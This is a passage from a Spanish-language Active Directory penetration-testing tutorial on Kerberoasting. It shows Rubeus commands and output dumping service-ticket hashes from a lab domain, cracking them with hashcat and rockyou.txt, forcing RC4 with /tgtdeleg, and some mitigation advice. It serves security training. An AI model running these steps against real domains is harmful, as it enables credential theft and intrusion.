        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
```

Como podemos ver al desplazarnos por el menú de ayuda de Rubeus, la herramienta tiene una gran cantidad de opciones para interactuar con Kerberos, la mayoría de las cuales están fuera del alcance de este módulo y se tratarán en profundidad en módulos posteriores sobre ataques avanzados de Kerberos. Vale la pena desplazarse por el menú, familiarizarse con las opciones y leer sobre las distintas tareas posibles. Algunas opciones incluyen:

* `Ejecución de Kerberoasting y salida de hashes a un archivo`
* `Usando credenciales alternativas`
* `Realizar Kerberoasting combinado con un ataque pass-the-ticket`
* `Cómo ejecutar Kerberoasting "opsec" para filtrar cuentas con AES habilitado`
* `Solicitud de tickets para contraseñas de cuentas configuradas entre un rango de fechas específico`
* `Establecer un límite en el número de entradas solicitadas`
* `Cómo realizar Kerberosting AES`

**Visualización de las capacidades de Rubeus**

![imagen](https://academy.hackthebox.com/storage/modules/143/rubeus_help.png)

Primero podemos usar Rubeus para recopilar algunas estadísticas. En el resultado que aparece a continuación, podemos ver que hay nueve usuarios que admiten Kerberoastable, siete de los cuales admiten el cifrado RC4 para solicitudes de tickets y dos admiten AES 128/256. Más adelante hablaremos más sobre los tipos de cifrado. También vemos que las nueve cuentas tenían su contraseña configurada este año (2022 al momento de escribir este artículo). Si viéramos alguna cuenta de SPN con sus contraseñas configuradas hace 5 años o más, podrían ser objetivos prometedores, ya que podrían tener una contraseña débil que se configuró y nunca se cambió cuando la organización era menos madura.

### **Rubeus - flag /stats**

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /stats

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] Listing statistics about target users, no ticket requests being performed.
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 9


 ------------------------------------------------------------
 | Supported Encryption Type                        | Count |
 ------------------------------------------------------------
 | RC4_HMAC_DEFAULT                                 | 7     |
 | AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96 | 2     |
 ------------------------------------------------------------

 ----------------------------------
 | Password Last Set Year | Count |
 ----------------------------------
 | 2022                   | 9     |
 ----------------------------------
```

Utilicemos Rubeus para solicitar tickets para cuentas con el atributo `admincount` establecido en `1`. Probablemente estos sean objetivos de alto valor y valdría la pena que nos concentremos inicialmente en ellos para realizar los esfuerzos de descifrado sin conexión con Hashcat. Asegúrese de especificar el indicador `/nowrap` para que el hash se pueda copiar más fácilmente para el descifrado sin conexión con Hashcat. Según la documentación, el indicador "`/nowrap`" evita que los blobs de tickets base64 se envuelvan en columnas para cualquier función"; por lo tanto, no tendremos que preocuparnos por recortar los espacios en blanco o las nuevas líneas antes de crackearlo con Hashcat.

### **Rubeus - flag /nowrap**

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'

[*] Total kerberoastable users : 3


[*] SamAccountName         : backupagent
[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
[*] PwdLastSet             : 2/15/2022 2:15:40 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam001.inlanefreight.local@INLANEFREIGHT.LOCAL*$750F377DEFA85A67EA0FE51B0B28F83D$049EE7BF77ABC968169E1DD9E31B8249F509080C1AE6C8575B7E5A71995F345CB583FECC68050445FDBB9BAAA83AC7D553EECC57286F1B1E86CD16CB3266827E2BE2A151EC5845DCC59DA1A39C1BA3784BA8502A4340A90AB1F8D4869318FB0B2BEC2C8B6C688BD78BBF6D58B1E0A0B980826842165B0D88EAB7009353ACC9AD4FE32811101020456356360408BAD166B86DBE6AEB3909DEAE597F8C41A9E4148BD80CFF65A4C04666A977720B954610952AC19EDF32D73B760315FA64ED301947142438B8BCD4D457976987C3809C3320725A708D83151BA0BFF651DFD7168001F0B095B953CBC5FC3563656DF68B61199D04E8DC5AB34249F4583C25AC48FF182AB97D0BF1DE0ED02C286B42C8DF29DA23995DEF13398ACBE821221E8B914F66399CB8A525078110B38D9CC466EE9C7F52B1E54E1E23B48875E4E4F1D35AEA9FBB1ABF1CF1998304A8D90909173C25AE4C466C43886A650A460CE58205FE3572C2BF3C8E39E965D6FD98BF1B8B5D09339CBD49211375AE612978325C7A793EC8ECE71AA34FFEE9BF9BBB2B432ACBDA6777279C3B93D22E83C7D7DCA6ABB46E8CDE1B8E12FE8DECCD48EC5AEA0219DE26C222C808D5ACD2B6BAA35CBFFCD260AE05EFD347EC48213F7BC7BA567FD229A121C4309941AE5A04A183FA1B0914ED532E24344B1F4435EA46C3C72C68274944C4C6D4411E184DF3FE25D49FB5B85F5653AD00D46E291325C5835003C79656B2D85D092DFD83EED3ABA15CE3FD3B0FB2CF7F7DFF265C66004B634B3C5ABFB55421F563FFFC1ADA35DD3CB22063C9DDC163FD101BA03350F3110DD5CAFD6038585B45AC1D482559C7A9E3E690F23DDE5C343C3217707E4E184886D59C677252C04AB3A3FB0D3DD3C3767BE3AE9038D1C48773F986BFEBFA8F38D97B2950F915F536E16E65E2BF67AF6F4402A4A862ED09630A8B9BA4F5B2ACCE568514FDDF90E155E07A5813948ED00676817FC9971759A30654460C5DF4605EE5A92D9DDD3769F83D766898AC5FC7885B6685F36D3E2C07C6B9B2414C11900FAA3344E4F7F7CA4BF7C76A34F01E508BC2C1E6FF0D63AACD869BFAB712E1E654C4823445C6BA447463D48C573F50C542701C68D7DBEEE60C1CFD437EE87CE86149CDC44872589E45B7F9EB68D8E02070E06D8CB8270699D9F6EEDDF45F522E9DBED6D459915420BBCF4EA15FE81EEC162311DB8F581C3C2005600A3C0BC3E16A5BEF00EEA13B97DF8CFD7DF57E43B019AF341E54159123FCEDA80774D9C091F22F95310EA60165C805FED3601B33DA2AFC048DEF4CCCD234CFD418437601FA5049F669FEFD07087606BAE01D88137C994E228796A55675520AB252E900C4269B0CCA3ACE8790407980723D8570F244FE01885B471BF5AC3E3626A357D9FF252FF2635567B49E838D34E0169BDD4D3565534197C40072074ACA51DB81B71E31192DB29A710412B859FA55C0F41928529F27A6E67E19BE8A6864F4BC456D3856327A269EF0D1E9B79457E63D0CCFB5862B23037C74B021A0CDCA80B43024A4C89C8B1C622A626DE5FB1F99C9B41749DDAA0B6DF9917E8F7ABDA731044CF0E989A4A062319784D11E2B43554E329887BF7B3AD1F3A10158659BF48F9D364D55F2C8B19408C54737AB1A6DFE92C2BAEA9E
```

***

### Una nota sobre los tipos de cifrado

Los siguientes ejemplos sobre tipos de cifrado no se pueden reproducir en el laboratorio del módulo porque el controlador de dominio de destino ejecuta Windows Server 2019. Más información sobre esto más adelante en esta sección.

Las herramientas de Kerberoasting normalmente solicitan `RC4 encryption`cuando realizan el ataque e inician solicitudes TGS-REQ. Esto se debe a que RC4 es [más débil](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) y más fácil de descifrar sin conexión utilizando herramientas como Hashcat que otros algoritmos de cifrado como AES-128 y AES-256. Al realizar Kerberoasting en la mayoría de los entornos, recuperaremos hashes que comiencen con `$krb5tgs$23$*`, un ticket cifrado RC4 (tipo 23).&#x20;

A veces, recibiremos un hash cifrado AES-256 (tipo 18) o un hash que comience con `$krb5tgs$18$*`. Si bien es posible descifrar tickets TGS AES-128 (tipo 17) y AES-256 (tipo 18) utilizando [Hashcat](https://github.com/hashcat/hashcat/pull/1955) , normalmente llevará mucho más tiempo que descifrar un ticket cifrado RC4 (tipo 23), pero sigue siendo posible, especialmente si se elige una contraseña débil. Veamos un ejemplo.

Comencemos por crear una cuenta SPN con el nombre `testspn`y usar Rubeus para aplicar Kerberoast a este usuario específico para probarlo. Como podemos ver, recibimos el ticket TGS RC4 (tipo 23) cifrado.

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1


[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$CEA71B221FC2C00F8886261660536CC1$4A8E252D305475EB9410FF3E1E99517F90E27FB588173ACE3651DEACCDEC62165DE6EA1E6337F3640632FA42419A535B501ED1D4D1A0B704AA2C56880D74C2940170DC0747CE4D05B420D76BF298226AADB53F2AA048BE813B5F0CA7A85A9BB8C7F70F16F746807D3B84AA8FE91B8C38AF75FB9DA49ED133168760D004781963DB257C2339FD82B95C5E1F8F8C4BD03A9FA12E87E278915A8362DA835B9A746082368A155EBB5EFB141DC58F2E46B7545F82278AF4214E1979B35971795A3C4653764F08C1E2A4A1EDA04B1526079E6423C34F88BDF6FA2477D28C71C5A55FA7E1EA86D93565508081E1946D796C0B3E6666259FEB53804B8716D6D076656BA9D392CB747AD3FB572D7CE130940C7A6415ADDB510E2726B3ACFA485DF5B7CE6769EEEF08FE7290539830F6DA25C359894E85A1BCFB7E0B03852C7578CB52E753A23BE59AB9D1626091376BA474E4BAFAF6EBDD852B1854FF46AA6CD1F7F044A90C9497BB60951C4E82033406ACC9B4BED7A1C1AFEF41316A58487AFEA4D5C07940C87367A39E66415D9A54B1A88DADE1D4A0D13ED9E474BDA5A865200E8F111996B846E4E64F38482CEE8BE4FC2DC1952BFFBD221D7284EFF27327C0764DF4CF68065385D31866DA1BB1A189E9F82C46316095129F06B3679EE1754E9FD599EB9FE96C10315F6C45300ECCBEB6DC83A92F6C08937A244C458DB69B80CE85F0101177E6AC049C9F11701E928685F41E850CA62F047B175ADCA78DCA2171429028CD1B4FFABE2949133A32FB6A6DC9E0477D5D994F3B3E7251FA8F3DA34C58FAAE20FC6BF94CC9C10327984475D7EABE9242D3F66F81CFA90286B2BA261EBF703ADFDF7079B340D9F3B9B17173EBA3624D9B458A5BD1CB7AF06749FF3DB312BCE9D93CD9F34F3FE913400655B4B6F7E7539399A2AFA45BD60427EA7958AB6128788A8C0588023DDD9CAA4D35459E9DEE986FD178EB14C2B8300C80931624044C3666669A68A665A72A1E3ABC73E7CB40F6F46245B206777EE1EF43B3625C9F33E45807360998B7694DC2C70ED47B45172FA3160FFABAA317A203660F26C2835510787FD591E2C1E8D0B0E775FC54E44A5C8E5FD1123FBEDB463DAFDFE6A2632773C3A1652970B491EC7744757872C1DDC22BAA7B4723FEC91C154B0B4262637518D264ADB691B7479C556F1D10CAF53CB7C5606797F0E00B759FCA56797AAA6D259A47FCCAA632238A4553DC847E0A707216F0AE9FF5E2B4692951DA4442DF86CD7B10A65B786FE3BFC658CC82B47D9C256592942343D05A6F06D250265E6CB917544F7C87645FEEFA54545FEC478ADA01B8E7FB6480DE7178016C9DC8B7E1CE08D8FA7178D33E137A8C076D097C1C29250673D28CA7063C68D592C30DCEB94B1D93CD9F18A2544FFCC07470F822E783E5916EAF251DFA9726AAB0ABAC6B1EB2C3BF6DBE4C4F3DE484A9B0E06FF641B829B651DD2AB6F6CA145399120E1464BEA80DC3608B6C8C14F244CBAA083443EB59D9EF3599FCA72C6997C824B87CF7F7EF6621B3EAA5AA0119177FC480A20B82203081609E42748920274FEBB94C3826D57C78AD93F04400DC9626CF978225C51A889224E3ED9E3BFDF6A4D6998C16D414947F9E157CB1594B268BE470D6FB489C2C6C56D2AD564959C5
```

Al consultar con PowerView, podemos ver que el atributo `msDS-SupportedEncryptionTypes` está configurado en `0`. El gráfico [aquí](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) nos indica que un valor decimal de `0`significa que no se ha definido un tipo de cifrado específico y que está configurado en el valor predeterminado de `RC4_HMAC_MD5`.

```powershell
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            0 testspn
```

A continuación, descifraremos este ticket con Hashcat y veremos cuánto tiempo tardó. La cuenta está configurada con una contraseña débil que se encontró en la `rockyou.txt`lista de palabras para nuestros propósitos. Al ejecutar esto con Hashcat, vemos que tardó cuatro segundos en descifrarse en una CPU y, por lo tanto, se descifraría casi instantáneamente en un potente equipo de descifrado de GPU y probablemente incluso en una sola GPU.

### **Crackeando el Ticket con Hashcat y rockyou.txt**

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>64bea80dc3608b6c8c14f244cbaa083443eb59d9ef3599fca72c6997c824b87cf7f7ef6621b3eaa5aa0119177fc480a20b82203081609e42748920274febb94c3826d57c78ad93f04400dc9626cf978225c51a889224e3ed9e3bfdf6a4d6998c16d414947f9e157cb1594b268be470d6fb489c2c6c56d2ad564959c5:welcome1$
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/ke...4959c5
Time.Started.....: Sun Feb 27 15:36:58 2022 (4 secs)
Time.Estimated...: Sun Feb 27 15:37:02 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   693.3 kH/s (5.41ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2789376/14344385 (19.45%)
Rejected.........: 0/2789376 (0.00%)
Restore.Point....: 2777088/14344385 (19.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: westham76 -> wejustare

Started: Sun Feb 27 15:36:57 2022
Stopped: Sun Feb 27 15:37:04 2022
```

{% endcode %}

Supongamos que nuestro cliente ha configurado cuentas SPN para admitir el cifrado `AES 128/256`.

![imagen](https://academy.hackthebox.com/storage/modules/143/aes_kerberoast.png)

Si verificamos esto con PowerView, veremos que `msDS-SupportedEncryptionTypes attribute` está configurado en `24`, lo que significa que los tipos de cifrado AES 128/256 son los únicos compatibles.

### **Comprobación de los tipos de cifrado admitidos**

```powershell
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            24 testspn
```

Solicitar un nuevo ticket con Rubeus nos mostrará que el nombre de la cuenta está usando encriptación AES-256 (tipo 18).

### **Rubeus - Solicitar un nuevo ticket**

```powershell-session
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : testspn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : testspn
[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
[*] PwdLastSet             : 2/27/2022 12:15:43 PM
[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*testspn/kerberoast.inlanefreight.local@INLANEFREIGHT.LOCAL*$8939F8C5B97A4CAA170AD706$84B0DD2C5A931E123918FFD64561BFE651F89F079A47053814244C0ECDF15DF136E5787FAC4341A1BDF6D5077EAF155A75ACF0127A167ABE4B2324C492ED1AF4C71FF8D51927B23656FCDE36C9A7AC3467E4DB6B7DC261310ED05FB7C73089763558DE53827C545FB93D25FF00B5D89FCBC3BBC6DDE9324093A3AADBE2C6FE21CFB5AFBA9DCC5D395A97768348ECCF6863EFFB4E708A1B55759095CCA98DE7DE0F7C149357365FBA1B73FCC40E2889EA75B9D90B21F121B5788E27F2FC8E5E35828A456E8AF0961435D62B14BADABD85D4103CC071A07C6F6080C0430509F8C4CDAEE95F6BCC1E3618F2FA054AF97D9ED04B47DABA316DAE09541AC8E45D739E76246769E75B4AA742F0558C66E74D142A98E1592D9E48CA727384EC9C3E8B7489D13FB1FDB817B3D553C9C00FA2AC399BB2501C2D79FBF3AF156528D4BECD6FF03267FB6E96E56F013757961F6E43838054F35AE5A1B413F610AC1474A57DE8A8ED9BF5DE9706CCDAD97C18E310EBD92E1C6CD5A3DE7518A33FADB37AE6672D15DACFE44208BAC2EABB729C24A193602C3739E2C21FB606D1337E1599233794674608FECE1C92142723DFAD238C9E1CB0091519F68242FBCC75635146605FDAD6B85103B3AFA8571D3727F11F05896103CB65A8DDE6EB29DABB0031DCF03E4B6D6F7D10E85E02A55A80CD8C93E6C8C3ED9F8A981BBEA01ABDEB306078973FE35107A297AF3985CF12661C2B8614D136B4AF196D27396C21859F40348639CD1503F517D141E2E20BB5F78818A1A46A0F63DD00FEF2C1785672B4308AE1C83ECD0125F30A2708A273B8CC43D6E386F3E1A520E349273B564E156D8EE7601A85D93CF20F20A21F0CF467DC0466EE458352698B6F67BAA9D65207B87F5E6F61FF3623D46A1911342C0D80D7896773105FEC33E5C15DB1FF46F81895E32460EEA32F423395B60582571551FF74D1516DDA3C3EBAE87E92F20AC9799BED20BF75F462F3B7D56DA6A6964B7A202FE69D9ED62E9CB115E5B0A50D5BBF2FD6A22086D6B720E1589C41FABFA4B2CD6F0EFFC9510EC10E3D4A2BEE80E817529483D81BE11DA81BBB5845FEC16801455B234B796728A296C65EE1077ABCF67A48B96C4BD3C90519DA6FF54049DE0BD72787F428E8707A5A46063CE57E890FC22687C4A1CF6BA30A0CA4AB97E22C92A095140E37917C944EDCB64535166A5FA313CEF6EEB5295F9B8872D398973362F218DF39B55979BDD1DAD5EC8D7C4F6D5E1BD09D87917B4562641258D1DFE0003D2CC5E7BCA5A0FC1FEC2398B1FE28079309BEC04AB32D61C00781C92623CA2D638D1923B3A94F811641E144E17E9E3FFB80C14F5DD1CBAB7A9B53FB5895DFC70A32C65A9996FB9752B147AFB9B1DFCBECA37244A88CCBD36FB1BF38822E42C7B56BB9752A30D6C8198B6D64FD08A2B5967414320D532F0404B3920A5F94352F85205155A7FA7EB6BE5D3A6D730318FE0BF60187A23FF24A84C18E8FC62DF6962D91D2A9A0F380987D727090949FEC4ADC0EF29C7436034A0B9D91BA36CC1D4C457392F388AB17E646418BA9D2C736B0E890CF20D425F6D125EDD9EFCA0C3DA5A6E203D65C8868EE3EC87B853398F77B91DDCF66BD942EC17CF98B6F9A81389489FCB60349163E10196843F43037E79E10794AC70F88225EDED2D51D26413D53
```

Para ejecutar esto a través de Hashcat, necesitamos usar el modo hash `19700`, `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)` que se encuentra en la práctica tabla [example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) de Hashcat . Ejecutamos el hash AES de la siguiente manera y verificamos el estado, que muestra que debería tomar más de 23 minutos ejecutar toda la lista de palabras de rockyou.txt escribiendo `s` para ver el estado del trabajo de descifrado.

### **Ejecutar Hashcat y comprobar el estado del crackeo**

```shell-session
afsh4ck@kali$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Name........: Kerberos 5, etype 18, TGS-REP
Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53
Time.Started.....: Sun Feb 27 16:07:50 2022 (57 secs)
Time.Estimated...: Sun Feb 27 16:31:06 2022 (22 mins, 19 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10277 H/s (8.99ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests
Progress.........: 583680/14344385 (4.07%)
Rejected.........: 0/583680 (0.00%)
Restore.Point....: 583680/14344385 (4.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:3264-3328
Candidates.#1....: skitzy -> sammy<3

[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =>
```

Cuando finalmente se descifra el hash, vemos que tardó 4 minutos y 36 segundos en descifrar una contraseña relativamente simple en una CPU. Esto sería mucho mayor si se utilizara una contraseña más segura y más larga.

**Viendo el tiempo que tardó en descifrarse**

```shell-session
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 18, TGS-REP
Hash.Target......: $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$8939f8c5b97...413d53
Time.Started.....: Sun Feb 27 16:07:50 2022 (4 mins, 36 secs)
Time.Estimated...: Sun Feb 27 16:12:26 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    10114 H/s (9.25ms) @ Accel:1024 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2789376/14344385 (19.45%)
Rejected.........: 0/2789376 (0.00%)
Restore.Point....: 2783232/14344385 (19.40%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4032-4095
Candidates.#1....: wenses28 -> wejustare
```

Podemos usar Rubeus con el indicador `/tgtdeleg` para especificar que solo queremos cifrado RC4 al solicitar un nuevo ticket de servicio. La herramienta hace esto especificando el cifrado RC4 como el único algoritmo que admitimos en el cuerpo de la solicitud TGS. Esto puede ser una medida de seguridad integrada en Active Directory para compatibilidad con versiones anteriores. Al usar este indicador, podemos solicitar un ticket cifrado RC4 (tipo 23) que se puede descifrar mucho más rápido.

### **Rubeus - flag /tgtdeleg**

![imagen](https://academy.hackthebox.com/storage/modules/143/kerb_tgs_18.png)

En la imagen anterior, podemos ver que al proporcionar la flag `/tgtdeleg`, la herramienta solicitó un ticket RC4 a pesar de que los tipos de cifrado admitidos están enumerados como AES 128/256. Este simple ejemplo muestra la importancia de la enumeración detallada y la investigación más profunda al realizar ataques como Kerberoasting. Aquí podríamos cambiar de AES a RC4 y reducir el tiempo de descifrado en más de 4 minutos y 30 segundos. En una interacción del mundo real donde tenemos una plataforma de descifrado de contraseñas de GPU sólida a nuestra disposición, este tipo de descifrado de hash podría resultar en un descifrado de hash en unas pocas horas en lugar de unos pocos días y podría hacer o deshacer nuestra evaluación.

{% hint style="info" %}
**Nota**: Esto no funciona contra un controlador de dominio de Windows Server 2019, independientemente del nivel funcional del dominio. Siempre devolverá un ticket de servicio cifrado con el nivel más alto de cifrado compatible con la cuenta de destino.
{% endhint %}

Dicho esto, si nos encontramos en un dominio con controladores de dominio que se ejecutan en Server 2016 o anterior (lo que es bastante común), habilitar AES no mitigará parcialmente el Kerberoasting al devolver solo tickets cifrados AES, que son mucho más difíciles de descifrar, sino que permitirá que un atacante solicite un ticket de servicio cifrado RC4. En los controladores de dominio de Windows Server 2019, habilitar el cifrado AES en una cuenta SPN dará como resultado que recibamos un ticket de servicio AES-256 (tipo 18), que es sustancialmente más difícil (pero no imposible) de descifrar, especialmente si se utiliza una contraseña de diccionario relativamente débil.

Es posible editar los tipos de cifrado utilizados por Kerberos. Esto se puede hacer abriendo la Política de grupo, editando la Política de dominio predeterminada y eligiendo: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, luego haciendo doble clic en `Network security: Configure encryption types allowed for Kerberos` y seleccionando el tipo de cifrado deseado permitido para Kerberos. Eliminar todos los demás tipos de cifrado excepto `RC4_HMAC_MD5` permitiría que el ejemplo anterior de degradación ocurriera en 2019. Eliminar la compatibilidad con AES introduciría una falla de seguridad en AD y probablemente nunca debería hacerse. Además, eliminar la compatibilidad con RC4 independientemente de la versión de Windows Server del controlador de dominio o el nivel funcional del dominio podría tener impactos operativos y debería probarse exhaustivamente antes de la implementación.

![imagen](https://academy.hackthebox.com/storage/modules/143/kerb_encrypt_types.png)

***

## <mark style="color:purple;">Mitigación y detección</mark>

Una mitigación importante para las cuentas de servicio no administradas es establecer una contraseña o frase de contraseña larga y compleja que no aparezca en ninguna lista de palabras y que lleve mucho tiempo descifrar. Sin embargo, se recomienda utilizar [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009) y [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) , que utilizan contraseñas muy complejas y rotan automáticamente en un intervalo establecido (como las cuentas de máquina) o cuentas configuradas con LAPS.

